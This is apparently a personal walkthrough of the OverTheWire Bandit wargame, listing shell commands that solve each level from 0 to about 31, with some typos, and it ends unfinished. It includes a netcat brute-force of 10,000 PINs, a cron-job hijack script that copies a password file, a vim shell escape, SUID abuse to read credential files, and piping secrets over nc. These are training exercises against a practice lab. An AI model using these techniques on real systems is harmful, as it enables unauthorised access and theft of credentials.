#### Bandit Level 0 → Level 1
```
grep -i password /home/bandit0/readme
```
#### Bandit Level 1 → Level 2
```
cat '/home/bandit1/-'
```
#### Bandit Level 2 → Level 3
```
cat /home/bandit2/spaces\ in\ this\ filename
```
#### Bandit Level 3 → Level 4
```
cat /home/bandit3/inhere/...Hiding-From-You
```
#### Bandit Level 4 → Level 5
Use `--` to escape the special character `-` and tell cat there are no more arguments
```
# determine which file is ASCII the cat the file
for f in *; do file -- "$f"; done
cat -- -file07
```
#### Bandit Level 5 → Level 6
```
# find the file that 1033 bytes:
find /home/bandit5/inhere -type f -size 1033c

# verify it is human readable and not executeable:
file /home/bandit5/inhere/maybehere07/.file02
ls -la /home/bandit5/inhere/maybehere07/.file02
cat /home/bandit5/inhere/maybehere07/.file02
```
#### Bandit Level 6 → Level 7
```
find / -type f -user bandit7 -group bandit6 -size 33c 2>/dev/null
cat /var/lib/dpkg/info/badnit7.password
```
#### Bandit Level 7 → Level 8
```
grep millionth /home/bandit7/data.txt | awk '{print $2}'
```
#### Bandit Level 8 → Level 9
```
cat /home/bandit8/data.txt | sort | uniq -c
```
#### Bandit Level 9 → Level 10
```
 strings /home/bandit9/data.txt | grep ==
```
#### Bandit Level 10 → Level 11
```
base64 -d /home/bandit10/data.txt
```
#### Bandit Level 11 → Level 12
Use the `tr` command to rotate the ASCII characters by 13 positions:
```
cat /home/bandit11/data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```
#### Bandit Level 12 → Level 13
Create a working directory:
```
mktemp -d
cp data.txt <TMP_DIR>
```
convert it back into its original binary form
```
xxd -r data.txt data.gz
```
Continuouzly decompress the file based on the new `file` output.  Shortened here:
```
gunzip -c data.gz > data.bz
bunzip2 -c data.bz > data.gz
gunzip -c data.gz > data.tz

tar -xvf data.tz
file data5.bin
cp data5.bin data5.bin.tz

tar -xvf data5.bin.tz
file data6.bin 
cp data6.bin data6.bin.bz
rm data6.bin

bzip2 -d data6.bin.bz
file data6.bin 
cp data6.bin data6.bin.tz

tar -xvf data6.bin.tz
file data8.bin 
cp data8.bin data8.bin.gz
gunzip -d data8.bin.gz

cat data8.bin
```
#### Bandit Level 12 → Level 13
Use the `tr` command to rotate the ASCII characters 13 positions:
```
cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```
#### Bandit Level 13 → Level 14
```
ssh -i sshkey.private bandit14@bandit.labs.overthewire.org -p 2220
```
#### Bandit Level 14 → Level 15
```
nc 127.0.0.1 30000 < /etc/bandit_pass/bandit14
```
#### Bandit Level 15 → Level 16
Use `ncat` to connect to the server using SSL/TLS encryption:
```
ncat -C --ssl 127.0.0.1 30001 < /etc/bandit_pass/bandit15
```
#### Bandit Level 16 → Level 17
```
# find out which ports in the range are open and speak SSL/TLS
nmap -sT -p 31000-32000 127.0.0.1 --script ssl-enum-ciphers

# submit the password
ncat -C --ssl 127.0.0.1 31790 < /etc/bandit_pass/bandit16

# copy the ssh key into a file
vim id_rsa_bandit17
chmod 700 id_rsa_bandit17

# ssh as bandit17
ssh -i id_rsa_bandit17 bandit17@bandit.labs.overthewire.org -p 2220
```
Bandit Level 17 → Level 18
```
diff passwords.old passwords.new
```
Bandit Level 18 → Level 19
```
ssh bandit18@bandit.labs.overthewire.org -p 2220 -t 'cat readme; bash -l'
```
Bandit Level 19 → Level 20
```
# find the suid binary in the home directory:
find /home/bandit19 -perm -u=s -type f 2>/dev/null

# grab the password
./bandit20-do cat /etc/bandit_pass/bandit20
```
Bandit Level 20 → Level 21
```
# start a listener in the background
nc -nlvp 4444 < /etc/bandit_pass/bandit20 &

# connect to that port with suid binary
./suconnect 4444 
```
Bandit Level 21 → Level 22
```
# review cronjobs and scripts
cat /etc/cron.d/cronjob_bandit22
cat /usr/bin/cronjob_bandit22.sh

# review file referenced in the bash srcipt
cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```
Bandit Level 22 → Level 23
```
# review cronjobs and scripts
cat /etc/cron.d/cronjob_bandit23
cat /usr/bin/cronjob_bandit23.sh

# recreate what the script is doing
echo "I am user bandit23" | md5sum | cut -d ' ' -f 1

# use md5 has to access the folder created in /tmp 
cat /tmp/8ca319486bfbbc3663ea0fbe81326349
```
Bandit Level 23 → Level 24
```
# review cronjobs and scripts
cat /etc/cron.d/cronjob_bandit24
cat /usr/bin/cronjob_bandit24.sh

# creat a working directory
mkdir /tmp/e
chmod 777 -R /tmp/e

# create script that will be excuted by the bandit24 cronjob
vim /tmp/e/script.sh

#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/e/pass.txt

touch /tmp/e/pass.txt
chmod 777 /tmp/e/pass.txt
chmod 777 /tmp/script.sh
mv /tmp/e/script.sh /var/spool/bandit24/foo/

# watch the file for the bandit24 password
watch cat /tmp/e/pass.txt
```
Bandit Level 24 → Level 25
```
mkdir /tmp/lab
cd /tm/lab
vim brute.sh

#!/bin/bash

password=$(cat /etc/bandit_pass/bandit24)

for pin in $(seq -w 0000 9999); do
        echo "$password $pin" >> /tmp/lab/combinations.txt
done
cat /tmp/lab/combinations.txt | nc localhost 30002 >> /tmp/lab/results.txt &

# find password in results
grep -v Wrong /tmp/lab/results.txt
```
Bandit Level 25 → Level 26
```
# check bandit26 default shell
getent passwd | grep bandit26

# see what the shell is doing
cat /usr/bin/showtext

# login with a very small window size
ssh -i ./bandit26.sshkey bandit26@localhost

# use v to enter vim
:e /etc/bandit_pass/bandit26
```
Bandit Level 26 → Level 27
```
# type following into vim to obtain a shell
:set shell=/bin/bash
:shell

# use the suid file in the home direcroty to grab the password
./bandit27-do cat /etc/bandit_pass/bandit27
```
Bandit Level 27 → Level 28
```
# clone repo into tmp directory using bandit27 password
git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo /tmp/clone

# grap password
cat README

```
Bandit Level 28 → Level 29
```
# clone repo into tmp directory using bandit28 password
git clone ssh://bandit28-git@localhost:2220/home/bandit28-git/repo /tmp/cloned

# review logs
git logs

# checkout previous vulnerbale version of the repo
git checkout fb0df1358b1ff146f581651a84bae622353a71c0

# review where pasword was removed
cat README.md
```

```
mkdir /tmp/clone_29
git clone ssh://bandit29-git@localhost:2220/home/bandit29-git/repo /tmp/clone_29

# review the available branches
git branch -a

# checkout the dev branch and review the README
git checkout remotes/origin/dev
cat README.md
```

```
mkdir /tmp/clone_30
git clone ssh://bandit30-git@localhost:2220/home/bandit30-git/repo /tmp/clone_30

# review tags for version history
git tag

# view the tag
git show secret

# checkout the dev branch and review the README
git checkout remotes/origin/dev
cat README.md
```
mkdir /tmp/clone_31
git clone ssh://bandit31-git@localhost:2220/home/bandit31-git/repo /tmp/clone_31
push stuff but need to get password back
